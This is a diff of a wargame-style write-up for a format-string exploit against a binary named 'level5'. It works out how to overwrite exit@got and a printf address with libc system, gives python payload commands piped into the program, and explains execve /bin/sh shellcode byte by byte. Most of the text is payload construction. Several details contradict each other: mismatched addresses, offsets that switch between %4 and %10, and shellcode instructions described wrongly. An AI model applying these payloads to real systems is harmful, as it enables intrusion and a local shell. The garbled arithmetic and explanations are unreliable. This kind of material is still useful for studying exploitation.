@@ -1,11 +1,11 @@
-exit:       0xf7e5eb70   <==>   \x70\xeb\xe5\xf7
+exit@got:   0x08048376   <==>   \x76\x83\x04\x08
 system:     0xf7e6aed0
 
 
-# Need to overwrite 0xf7e5eb70 (QT.exit) with 0xf7e6aed0 (LIBC .system)
+# Need to overwrite 0x08048376 (QT.exit) with 0xf7e6aed0 (LIBC .system)
 
-# It means writing 0xf7e6 (63462) @ 0xf7e5eb70 + 2 = 0xf7e5eb72 (high order)
-#              and 0xaed0 (44752) @ 0xf7e5eb70 (low order)
+# It means writing 0xf7e6 (63462) @ 0x08048376 + 2 = 0xf7e5eb72 (high order)
+#              and 0xaed0 (44752) @ 0x08048376 (low order)
 
 # Now, we have to figure out the value to set for the padding. Here is the formula
 [The value we want] - [The bytes alredy wrote] = [The value to set].
@@ -15,14 +15,82 @@ It'll will be 44752 - 8 = 44744, because we already wrote 8 bytes (the two 4 byt
 # Then, the high order bytes :
 It'll will be 63462 - 44752 = 18710, because we already wrote 44752 bytes (the two 4 bytes addresses and 44744 bytes from the previous writing).
 
- # Now we can construct the exploit (note our write offset is %4 so we want [°4,85] as offsets instead of [°7,%8]) :
-It'll be :  \x70\xeb\xe5\xf7\x72\xeb\xe5\xf7%44744x%4$hn%18710x%5$hn.
-Let me explain :    \x70\xeb\xe5\xf7 or 0xf7e5eb70 (in reverse order) points to the low order bytes.
-                    \x72\xeb\xe5\xf7 or 0xf7e5eb72 (in reverse order) points to the high order bytes.
+# Now we can construct the exploit (note our write offset is %4 so we want [%10,%11] as offsets instead of [%7,%8]) :
+It'll be :  \x76\x83\x04\x08\x78\x83\x04\x08%44744x%4$hn%18710x%5$hn.
+Let me explain :    \x76\x83\x04\x08 or 0x08048376 (in reverse order) points to the low order bytes.
+                    \x78\x83\x04\x08 or 0x08048378 (in reverse order) points to the high order bytes.
                     %44744× will write 44744 bytes on the standard output.
-                    %4$hn will write 8 + 44744 = 44752 bytes (or 0xaed0) at the first address specified (0xf7e5eb70).
-                    %1951x will write 1951 bytes on the standard output.
-                    %5$h will write 8 + 44744 + 18710 = 63462 (or 0xf7e6) at the second address specified (0xf7e5eb72).
+                    %10$hn will write 8 + 44744 = 44752 bytes (or 0xaed0) at the first address specified (0xf7e5eb70).
+                    %18710x will write 18710 bytes on the standard output.
+                    %11$h will write 8 + 44744 + 18710 = 63462 (or 0xf7e6) at the second address specified (0xf7e5eb72).
 
 
-python -c "print '\x70\xeb\xe5\xf7\x72\xeb\xe5\xf7%44744x%4$hn%18710x%5$hn'" > /tmp/payload
+python -c "print '\x76\x83\x04\x08 \x78\x83\x04\x08 %44744x %10$hn %18710x %11$hn'" > /tmp/exploit
+cat /tmp/exploit - | ./level5
+
+
+
+printf:     0x080497d4   <==>   \xd4\x97\x04\x08
+system:     0xf7e6aed0
+
+# Need to overwrite 0x80497d4 (QT.exit) with 0xf7e6aed0 (LIBC .system)
+
+# It means writing 0xf7e6 (63462) @ 0x80497d4 + 2 = 0x80497d6 (high order)
+#              and 0xaed0 (44752) @ 0x80497d4 (low order)
+
+# Now, we have to figure out the value to set for the padding. Here is the formula
+[The value we want] - [The bytes alredy wrote] = [The value to set].
+# Let's start with the low order bytes :
+It'll will be 44752 - 8 = 44744, because we already wrote 8 bytes (the two 4 bytes addresses).
+
+# Then, the high order bytes :
+It'll will be 63462 - 44752 = 18710, because we already wrote 44752 bytes (the two 4 bytes addresses and 44744 bytes from the previous writing).
+
+# Now we can construct the exploit (note our write offset is %10 so we want [%10,%11] as offsets instead of [%7,%8]) :
+It'll be :  \x70\xeb\xe5\xf7\x72\xeb\xe5\xf7%44744x%4$hn%18710x%5$hn.
+Let me explain :    \xd4\x97\x04\x08 or 0x80497d4 (in reverse order) points to the low order bytes.
+                    \xd6\x97\x04\x08 or 0x80497d6 (in reverse order) points to the high order bytes.
+                    %44744× will write 44744 bytes on the standard output.
+                    %10$hn will write 8 + 44744 = 44752 bytes (or 0xaed0) at the first address specified (0x80497d4).
+                    %18710x will write 18710 bytes on the standard output.
+                    %11$h will write 8 + 44744 + 18710 = 63462 (or 0xf7e6) at the second address specified (0x80497d6).
+
+
+python -c "print '\xd4\x97\x04\x08\xd6\x97\x04\x08%44744x%10$hn%18710x%11$hn'" > /tmp/payload
+
+
+printf disas main: 08 04 83 40 <==> \x40\x83\x04\x08
+
+
+exit@got = 0x08048376  08 04 83 76 \x76\x83\x04\x08
+
+env var address = 0xffffdd76
+
+ffff = 65535
+
+dd76 = 56694
+
+56694 - 8 = 56686
+
+65535 - 56694 = 8841
+
+\x76\x83\x04\x08
+
+\x78\x83\x04\x08
+
+python -c "print '\x76\x83\x04\x08' + '\x78\x83\x04\x08' + '%56686x' + '%10$n' +  '%8841x' + '%11$n'" > /tmp/exploit
+
+
+This shellcode is a sequence of machine code instructions that is typically used to perform a specific task on a target system, such as launching a shell. The specific task performed by this shellcode is to execute a shell.
+
+The shellcode contains the following instructions:
+
+\x31\xc0: xor the EAX register with itself, effectively setting it to zero.
+\x50: push the value of the EAX register onto the stack.
+\x68\x2f\x2f\x73\x68: push the string "/bin//sh" onto the stack.
+\x68\x2f\x62\x69\x6e: push the string "/bin" onto the stack.
+\x87\xe3: xor the ESP register with the EBX register, effectively placing the string "/bin//sh" in the EBX register.
+\xb0\x0b: move the value 11 into the AL register. This value is the system call number for execve.
+\xcd\x80: issue an interrupt to execute the system call.
+
+Taken together, these instructions set up and execute a system call to run the "/bin/sh" command, which launches a shell.
